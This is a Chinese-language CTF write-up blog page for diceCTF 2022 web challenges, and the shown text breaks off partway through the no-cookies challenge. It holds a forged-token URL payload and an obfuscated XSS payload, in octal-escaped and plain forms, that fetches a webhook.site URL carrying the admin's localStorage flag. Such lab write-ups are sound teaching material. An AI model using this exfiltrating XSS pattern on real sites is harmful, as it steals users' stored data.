@@ -1,0 +1,832 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>AmiaaaZ's Site | diceCTF2022 Wp</title>
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=generator content="Hugo 0.92.2">
+<meta name=ROBOTS content="INDEX, FOLLOW">
+<link href=/dist/app.css rel=stylesheet>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
+<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
+<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
+<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
+</head>
+<body class="bg-gray-100 text-gray-700 font-sans">
+<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
+<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
+<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
+<div>
+<h2>
+<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
+</h2>
+</div>
+<h1 class=pt-2>diceCTF2022 Wp</h1>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">建议改为js-jail，已经学了亿吨js知识了</h3>
+<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
+<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/ctf>CTF</a>
+&nbsp;&nbsp;
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/wp>wp</a>
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2022-02-17T00:00:24+08:00>2022-2-17 00:00</time>
+</div>
+<details class=toc open>
+<summary>
+<hr>
+</summary>
+<div class="inline toc-content">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#miscwelcome>misc/welcome</a></li>
+<li><a href=#webknock-knock>web/knock-knock</a></li>
+<li><a href=#webblazingfast>web/blazingfast</a></li>
+<li><a href=#webno-cookies>web/no-cookies</a>
+<ul>
+<li><a href=#非预期>非预期</a></li>
+</ul>
+</li>
+<li><a href=#webvm-calc>web/vm-calc</a></li>
+<li><a href=#webshadow>web/shadow</a></li>
+<li><a href=#webdenoblog>***web/denoblog</a></li>
+<li><a href=#miscundefined>misc/undefined</a></li>
+</ul>
+</nav>
+</div>
+</details>
+<hr>
+</div>
+</header>
+<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+<article>
+<section class="mx-auto content">
+<div class=c-rich-text><p><a href=https://ctf.dicega.ng/challs>https://ctf.dicega.ng/challs</a> | <a href=https://ctftime.org/event/1541/tasks/>https://ctftime.org/event/1541/tasks/</a></p>
+<p><a href=https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ>https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ</a> | 官方wp</p>
+<p><a href=https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/>https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</a> | 建议全部看完</p>
+<p><a href=https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups>https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups</a> | 比较详细的wp</p>
+<ul>
+<li><input disabled type=checkbox> TI-1337：属于是深入了解PVM，建议直接看别的师傅们的wp</li>
+<li><input disabled type=checkbox> Vinegar：wp看不懂，涉及pwn和深入的pickle操作</li>
+<li><input disabled type=checkbox> denoblog：一转pwn，看懂 但是不会</li>
+<li><input disabled type=checkbox> carrot：很复杂的XS-Leaks，放弃</li>
+<li><input disabled type=checkbox> dicevault：说是致敬vault，把vault做了之后看这个还是不会做，寄</li>
+<li><input disabled type=checkbox> noteKeeper：很复杂的xss，寄</li>
+</ul>
+<p>————属于是复现流做题选手重现江湖，就会做1道，其余全复现（哭哭），上面这几道题由于个人水平有限，复现都复不了，非常非常非常失败，建议看别的wp</p>
+<h2 id=miscwelcome>misc/welcome</h2>
+<blockquote>
+<p>Please join the competition <a href=https://discord.com/invite/CbCXtrDE5m>Discord</a> and read the <code>#rules</code> channel.</p>
+</blockquote>
+<p><code>dice{sice}</code></p>
+<h2 id=webknock-knock>web/knock-knock</h2>
+<blockquote>
+<p>Knock knock? Who&rsquo;s there? Another pastebin!!</p>
+<p><a href=https://knock-knock.mc.ax/>knock-knock.mc.ax</a></p>
+<p><a href=https://static.dicega.ng/uploads/d90311de33b98f393614654acad1e2f57ac87b0a309ee0548a5f9e8b18f70a8b/index.js>index.js</a> | <a href=https://static.dicega.ng/uploads/6035c50d5bc8f1178f87aa6d16847cda0e611bdd68f72928f81f952ddef762c9/Dockerfile>Dockerfile</a></p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>const</span> <span style=color:#75af00>crypto</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;crypto&#39;</span><span style=color:#111>);</span>
+
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>Database</span> <span style=color:#111>{</span>
+  <span style=color:#75af00>constructor</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>notes</span> <span style=color:#f92672>=</span> <span style=color:#111>[];</span>
+    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>secret</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`secret-</span><span style=color:#d88200>${</span><span style=color:#75af00>crypto</span><span style=color:#111>.</span><span style=color:#75af00>randomUUID</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>;</span>
+  <span style=color:#111>}</span>
+
+  <span style=color:#75af00>createNote</span><span style=color:#111>({</span> <span style=color:#75af00>data</span> <span style=color:#111>})</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>id</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>notes</span><span style=color:#111>.</span><span style=color:#75af00>length</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>notes</span><span style=color:#111>.</span><span style=color:#75af00>push</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>{</span>
+      <span style=color:#75af00>id</span><span style=color:#111>,</span>
+      <span style=color:#75af00>token</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>generateToken</span><span style=color:#111>(</span><span style=color:#75af00>id</span><span style=color:#111>),</span>
+    <span style=color:#111>};</span>
+  <span style=color:#111>}</span>
+
+  <span style=color:#75af00>getNote</span><span style=color:#111>({</span> <span style=color:#75af00>id</span><span style=color:#111>,</span> <span style=color:#75af00>token</span> <span style=color:#111>})</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>token</span> <span style=color:#f92672>!==</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>generateToken</span><span style=color:#111>(</span><span style=color:#75af00>id</span><span style=color:#111>))</span> <span style=color:#00a8c8>return</span> <span style=color:#111>{</span> <span style=color:#75af00>error</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;invalid token&#39;</span> <span style=color:#111>};</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>id</span> <span style=color:#f92672>&gt;=</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>notes</span><span style=color:#111>.</span><span style=color:#75af00>length</span><span style=color:#111>)</span> <span style=color:#00a8c8>return</span> <span style=color:#111>{</span> <span style=color:#75af00>error</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;note not found&#39;</span> <span style=color:#111>};</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>{</span> <span style=color:#75af00>data</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>notes</span><span style=color:#111>[</span><span style=color:#75af00>id</span><span style=color:#111>]</span> <span style=color:#111>};</span>
+  <span style=color:#111>}</span>
+
+  <span style=color:#75af00>generateToken</span><span style=color:#111>(</span><span style=color:#75af00>id</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#75af00>crypto</span>
+      <span style=color:#111>.</span><span style=color:#75af00>createHmac</span><span style=color:#111>(</span><span style=color:#d88200>&#39;sha256&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>secret</span><span style=color:#111>)</span>
+      <span style=color:#111>.</span><span style=color:#75af00>update</span><span style=color:#111>(</span><span style=color:#75af00>id</span><span style=color:#111>.</span><span style=color:#75af00>toString</span><span style=color:#111>())</span>
+      <span style=color:#111>.</span><span style=color:#75af00>digest</span><span style=color:#111>(</span><span style=color:#d88200>&#39;hex&#39;</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>db</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Database</span><span style=color:#111>();</span>
+<span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>createNote</span><span style=color:#111>({</span> <span style=color:#75af00>data</span><span style=color:#f92672>:</span> <span style=color:#75af00>process</span><span style=color:#111>.</span><span style=color:#75af00>env</span><span style=color:#111>.</span><span style=color:#75af00>FLAG</span> <span style=color:#111>});</span>
+
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span> <span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span> <span style=color:#111>}));</span>
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span><span style=color:#d88200>&#39;public&#39;</span><span style=color:#111>));</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/create&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>data</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#39;no data provided.&#39;</span><span style=color:#111>;</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#111>{</span> <span style=color:#75af00>id</span><span style=color:#111>,</span> <span style=color:#75af00>token</span> <span style=color:#111>}</span> <span style=color:#f92672>=</span> <span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>createNote</span><span style=color:#111>({</span> <span style=color:#75af00>data</span><span style=color:#f92672>:</span> <span style=color:#75af00>data</span><span style=color:#111>.</span><span style=color:#75af00>toString</span><span style=color:#111>()</span> <span style=color:#111>});</span>
+  <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>redirect</span><span style=color:#111>(</span><span style=color:#d88200>`/note?id=</span><span style=color:#d88200>${</span><span style=color:#75af00>id</span><span style=color:#d88200>}</span><span style=color:#d88200>&amp;token=</span><span style=color:#d88200>${</span><span style=color:#75af00>token</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>);</span>
+<span style=color:#111>});</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/note&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#111>{</span> <span style=color:#75af00>id</span><span style=color:#111>,</span> <span style=color:#75af00>token</span> <span style=color:#111>}</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>;</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>note</span> <span style=color:#f92672>=</span> <span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>getNote</span><span style=color:#111>({</span>
+    <span style=color:#75af00>id</span><span style=color:#f92672>:</span> <span style=color:#111>parseInt</span><span style=color:#111>(</span><span style=color:#75af00>id</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#39;-1&#39;</span><span style=color:#111>),</span>
+    <span style=color:#75af00>token</span><span style=color:#f92672>:</span> <span style=color:#111>(</span><span style=color:#75af00>token</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>(),</span>
+  <span style=color:#111>});</span>
+  <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>error</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>error</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>data</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span>
+<span style=color:#111>});</span>
+
+<span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>,</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+  <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;listening on port 3000&#39;</span><span style=color:#111>);</span>
+<span style=color:#111>});</span>
+</code></pre></div><p>典型的pastebin，提前将环境变量中的flag写到其中，对于note有id和token两项索引的标识（id是note的长度，note是生成的uuid）</p>
+<p>看起来很安全，但是uuid用的key其实根本没调用<code>crypto.randomUUID</code>这个函数</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220207154404210.png alt=image-20220207154404210></p>
+<p>而是一个完全的定值，flag的id=1，我们可以直接生成对应的token</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75af00>crypto</span><span style=color:#111>.</span><span style=color:#75af00>createHmac</span><span style=color:#111>(</span><span style=color:#d88200>&#39;sha256&#39;</span><span style=color:#111>,</span><span style=color:#75af00>secret</span><span style=color:#111>).</span><span style=color:#75af00>update</span><span style=color:#111>(</span><span style=color:#d88200>&#39;0&#39;</span><span style=color:#111>).</span><span style=color:#75af00>digest</span><span style=color:#111>(</span><span style=color:#d88200>&#39;hex&#39;</span><span style=color:#111>)</span>
+</code></pre></div><p>值得注意的是这个定值和js的版本有关系，win和linux下的运行结果也有差异（换行符的问题</p>
+<p>最后的token值</p>
+<pre tabindex=0><code>'7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264'
+</code></pre><p>paylaod</p>
+<pre tabindex=0><code>/note?id=0&amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
+</code></pre><h2 id=webblazingfast>web/blazingfast</h2>
+<blockquote>
+<p>I made a blazing fast MoCkInG CaSe converter!</p>
+<p><a href=https://blazingfast.mc.ax/>blazingfast.mc.ax</a> | <a href=https://admin-bot.mc.ax/blazingfast>Admin Bot</a></p>
+<p><a href=https://static.dicega.ng/uploads/c37db76fc7e66f32dee53b48652868aefd79193c1b5936e1f2441e3c70cfcdfa/blazingfast.tar>blazingfast.tar</a> | <a href=https://static.dicega.ng/uploads/1286aac5ffb57d27c1dc1e0221c7c3691e575181720449df62dff67d10ec6749/admin-bot.js>admin-bot.js</a> | <a href=https://static.dicega.ng/uploads/209c5168fc160763f28a23f23280f921c7e544fb87323726e48584b89d774825/blazingfast.c>blazingfast.c</a></p>
+</blockquote>
+<p>这个题特殊在结合了webassembly，是个不常见的点（虽然在这题里作用并不大），整体思路还是比较清晰的</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209014034656.png alt=image-20220209014034656></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209014118363.png alt=image-20220209014118363></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209014131466.png alt=image-20220209014131466></p>
+<p>肯定是要xss的，接下来要思考如何绕过<code>mock</code>中的过滤，我在做的时候没有做出来，下面是复现</p>
+<p>————先说一下很多人采用的非预期想法：结合了wasm（c语言编译）的数据写入，在末尾没有写入null-byte字符，而js只有在遇到null-byte才会停止数据读入，利用这一点我们可以完成数据走私smuggle，发送我们的payload；首先发送带有垃圾数据的xss payload，此时因为waf的检测而报错，之后再发送一个payload，覆盖前面的垃圾数据部分而留下xss的部分，并且并不会对xss的部分进行大小写的转换</p>
+<p>这要求我们发送两次payload，而同时给admin的只有一个url，肯定不行</p>
+<p>————预期解和这个差别其实并不很大，采用离谱的unicode欺骗payload的实际长度</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209021127464.png alt=image-20220209021127464></p>
+<p>首先检测输入内容的长度 大于1000退出，之后全部转为大写后再读入buf数组中，之后进行<code>blazingfast.mock()</code>处理时依据的length则是最开始init时的长度，只有膨胀前的部分会被<code>mock</code>处理，而随后剩下的部分将被走私读入<code>mocking</code>中，作为<code>mock</code>的返回值留到页面上 <code>document.getElementById('result').innerHTML = mock(str);</code></p>
+<p>关于获取flag的部分，我们需要获取admin的localStorage中的flag，需要<code>fetch</code>到我们的hookbin中，由于window是小写不能直接操作他，可以构造函数或是用原型的方式；payload可以用8进制或html实体</p>
+<p>payload</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75af00>ﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄ</span><span style=color:#f92672>&lt;</span><span style=color:#75af00>img</span> <span style=color:#75af00>src</span><span style=color:#f92672>=</span><span style=color:#75af00>x</span> <span style=color:#75af00>onerror</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;&#39;&#39;[&#39;\141\164&#39;][&#39;\137\137\160\162\157\164\157\137\137&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\146\145\164\143\150(`\150\164\164\160\163://\167\145\142\150\157\157\153.\163\151\164\145/90396\1465\141-59\146\141-40\146\145-\14182\146-\145\14421\1415\14611009?Q=${\154\157\143\141\154S\164\157\162\141\147\145.\146\154\141\147}`)&#39;)()&#34;</span><span style=color:#f92672>/&gt;</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>&lt;</span><span style=color:#75af00>img</span> <span style=color:#75af00>src</span><span style=color:#f92672>=</span><span style=color:#75af00>x</span> <span style=color:#75af00>onerror</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;&#39;&#39;[&#39;at&#39;][&#39;__proto__&#39;][&#39;constructor&#39;](&#39;fetch(`https://webhook.site/90396f5a-59fa-40fe-a82f-ed21a5f11009?Q=${localStorage.flag}`)&#39;)()&#34;</span><span style=color:#f92672>/&gt;</span>
+</code></pre></div><h2 id=webno-cookies>web/no-cookies</h2>
+<blockquote>
+<p>I found a more secure way to authenticate users. No cookies, no problems!</p>
+<p><a href=https://instancer.mc.ax/no-cookies>instancer.mc.ax/no-cookies</a> | <a href=https://admin-bot.mc.ax/no-cookies>Admin Bot</a></p>
+<p><a href=https://static.dicega.ng/uploads/40115eacc0285fc48defd70f48bd24608ca8ffa8b5600c0e7ed0308b780b432d/dist.tar>dist.tar</a> | <a href=https://static.dicega.ng/uploads/d53bcd4311512459be586dede3b593170870500465dce9bada612dcfda0b101d/index.js>index.js</a> | <a href=https://static.dicega.ng/uploads/c53891883a44e368d11a50bd8c13285009bf907571e4b826dee8f73d8d09ecb5/admin-bot.js>admin-bot.js</a></p>
+</blockquote>
+<p>还是先看admin bot</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>import</span> <span style=color:#75af00>flag</span> <span style=color:#75af00>from</span> <span style=color:#d88200>&#39;./flag.txt&#39;</span><span style=color:#111>;</span>
+
+<span style=color:#00a8c8>function</span> <span style=color:#75af00>sleep</span><span style=color:#111>(</span><span style=color:#75af00>time</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Promise</span><span style=color:#111>((</span><span style=color:#75af00>resolve</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>setTimeout</span><span style=color:#111>(</span><span style=color:#75af00>resolve</span><span style=color:#111>,</span> <span style=color:#75af00>time</span><span style=color:#111>);</span>
+  <span style=color:#111>});</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>export</span> <span style=color:#00a8c8>default</span> <span style=color:#111>{</span>
+  <span style=color:#75af00>id</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;no-cookies&#39;</span><span style=color:#111>,</span>
+  <span style=color:#75af00>name</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;no-cookies&#39;</span><span style=color:#111>,</span>
+  <span style=color:#75af00>urlRegex</span><span style=color:#f92672>:</span>
+    <span style=color:#d88200>/^https:\/\/no-cookies-[a-f0-9]{16}\.mc\.ax\/view\?id=[a-f0-9]{32}$/</span><span style=color:#111>,</span>
+  <span style=color:#75af00>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>10000</span><span style=color:#111>,</span>
+  <span style=color:#75af00>extraFields</span><span style=color:#f92672>:</span> <span style=color:#111>[</span>
+    <span style=color:#111>{</span>
+      <span style=color:#75af00>name</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;instance&#39;</span><span style=color:#111>,</span>
+      <span style=color:#75af00>displayName</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;Instance ID&#39;</span><span style=color:#111>,</span>
+      <span style=color:#75af00>placeholder</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;no-cookies-{THIS}.mc.ax&#39;</span><span style=color:#111>,</span>
+      <span style=color:#75af00>regex</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;^[0-9a-f]{16}$&#39;</span><span style=color:#111>,</span>
+    <span style=color:#111>},</span>
+  <span style=color:#111>],</span>
+  <span style=color:#75af00>handler</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>async</span> <span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#75af00>ctx</span><span style=color:#111>,</span> <span style=color:#111>{</span> <span style=color:#75af00>instance</span> <span style=color:#111>})</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>page</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>newPage</span><span style=color:#111>();</span>
+
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>doLogin</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>async</span> <span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>,</span> <span style=color:#75af00>password</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+      <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Promise</span><span style=color:#111>((</span><span style=color:#75af00>resolve</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+        <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>once</span><span style=color:#111>(</span><span style=color:#d88200>&#39;dialog&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>first</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
